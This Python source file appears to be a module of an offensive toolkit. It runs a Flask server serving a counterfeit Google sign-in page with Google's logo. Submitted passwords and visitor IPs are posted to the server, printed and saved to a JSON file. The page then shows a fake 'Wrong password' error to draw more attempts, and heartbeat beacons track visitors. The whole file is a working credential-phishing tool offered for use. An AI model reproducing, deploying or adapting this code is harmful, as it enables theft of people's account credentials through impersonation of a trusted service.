import os
import sys
import json
import time
from flask import Flask, render_template_string, request, jsonify
from core.promptui import *

app = Flask(__name__)
DATA_JSON_FILE = "password_captures.json"
active_visitors = {}

GOOGLE_PASSWORD_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-white flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 sm:px-10 sm:py-12 rounded-2xl sm:border border-gray-300 w-full max-w-md shadow-none sm:shadow-sm">
        <div class="text-center mb-6">
            <svg class="mx-auto h-8 w-auto mb-3" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
            </svg>
            <h1 class="text-2xl font-normal text-gray-800">Welcome</h1>
            
            <div class="inline-flex items-center gap-2 mt-3 px-3 py-1.5 border border-gray-300 rounded-full text-sm text-gray-700 bg-gray-50">
                <div class="w-5 h-5 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-bold">U</div>
                <span>user@gmail.com</span>
            </div>
        </div>

        <form id="unlock-form" class="space-y-6">
            <div class="relative">
                <input type="password" id="password-input" required
                       class="w-full px-4 py-3.5 bg-transparent border border-gray-300 rounded-lg text-gray-900 focus:outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600 transition peer placeholder-transparent"
                       placeholder="Enter your password" />
                <label for="password-input" class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-gray-600 transition-all peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-placeholder-shown:top-3.5 peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-blue-600">Enter your password</label>
            </div>

            <div class="flex items-center text-sm">
                <label class="flex items-center text-gray-600 cursor-pointer">
                    <input type="checkbox" id="show-pass" class="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500 mr-2">
                    Show password
                </label>
            </div>

            <div id="error-msg" class="text-red-600 text-xs hidden">Wrong password. Try again or click Forgot password to reset it.</div>

            <div class="flex items-center justify-between pt-2">
                <a href="#" class="text-sm text-blue-600 hover:text-blue-800 font-medium">Forgot password?</a>
                <button type="submit" id="submit-btn"
                        class="bg-blue-600 hover:bg-blue-700 text-white font-medium px-6 py-2 rounded-lg transition duration-200 shadow-sm">
                    Next
                </button>
            </div>
        </form>
    </div>

    <script>
        const form = document.getElementById('unlock-form');
        const passwordInput = document.getElementById('password-input');
        const showPass = document.getElementById('show-pass');
        const submitBtn = document.getElementById('submit-btn');
        const errorMsg = document.getElementById('error-msg');

        showPass.addEventListener('change', () => {
            passwordInput.type = showPass.checked ? 'text' : 'password';
        });

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const pwd = passwordInput.value.trim();
            if (!pwd) return;

            submitBtn.disabled = true;
            submitBtn.innerText = 'Loading...';

            fetch('/capture-password', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pwd })
            })
            .then(res => res.json())
            .then(data => {
                setTimeout(() => {
                    errorMsg.classList.remove('hidden');
                    submitBtn.disabled = false;
                    submitBtn.innerText = 'Next';
                    passwordInput.value = '';
                    passwordInput.focus();
                }, 1200);
            })
            .catch(err => {
                submitBtn.disabled = false;
                submitBtn.innerText = 'Next';
            });
        });

        setInterval(function() {
            navigator.sendBeacon('/heartbeat');
        }, 5000);
    </script>
</body>
</html>
"""

def save_capture(data):
    records = []
    if os.path.exists(DATA_JSON_FILE):
        try:
            with open(DATA_JSON_FILE, "r") as f:
                records = json.load(f)
        except:
            pass
    records.append(data)
    with open(DATA_JSON_FILE, "w") as f:
        json.dump(records, f, indent=4)

@app.route('/')
def index():
    return render_template_string(GOOGLE_PASSWORD_TEMPLATE)

@app.route('/capture-password', methods=['POST'])
def capture_password():
    req = request.get_json()
    ip = request.remote_addr
    password = req.get('password', 'N/A')
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{PromptUi.result} [PASSWORD CAPTURED] IP: {ip} | Password: \033[1;32m{password}\033[0m | Time: {timestamp}")
    save_capture({"ip": ip, "password": password, "timestamp": timestamp})
    return jsonify({"status": "success"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    ip = request.remote_addr
    if ip not in active_visitors:
        print(f"{PromptUi.result} New Visitor Detected -> {ip}")
    active_visitors[ip] = time.time()
    return "", 204

class Module:
    def __init__(self):
        self.info = {
            'name': 'Google-Style Password Phishing',
            'description': 'Generates an authentic Google-styled password verification phishing page.',
            'author': 'Quwais',
            'options': {
                'PORT': {
                    'default': '8080',
                    'required': True,
                    'desc': 'Local port to run the phishing server'
                }
            }
        }

    def run(self, options):
        try:
            port = int(options.get('PORT', 8080))
        except ValueError:
            port = 8080

        if os.geteuid() != 0:
            print(f"{PromptUi.error} This module requires root access.")
            return

        print(f"{PromptUi.info} Starting Google-Style Password Phishing server...")
        print(f"{PromptUi.info} Listening on port {port}...")
        print(f"{PromptUi.result} Waiting for visitor interaction...\n")

        try:
            app.run(host='0.0.0.0', port=port, debug=False)
        except Exception as e:
            print(f"{PromptUi.error} Error running server: {e}")
